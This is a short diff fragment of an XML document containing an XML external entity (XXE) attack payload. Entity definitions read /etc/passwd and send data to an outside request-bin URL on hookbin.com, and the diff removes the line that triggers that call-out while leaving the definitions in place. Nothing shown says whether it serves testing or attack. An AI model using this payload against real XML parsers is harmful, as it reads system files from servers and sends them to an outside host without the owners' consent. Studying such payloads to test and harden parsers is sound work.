@@ -4,4 +4,3 @@
   <!ENTITY c SYSTEM "/etc/passwd">
   <!ENTITY callhome SYSTEM "https://hookbin.com/bin/v0PP33lP?%xxe;">
 ]>
-<foo>&callhome;</foo>
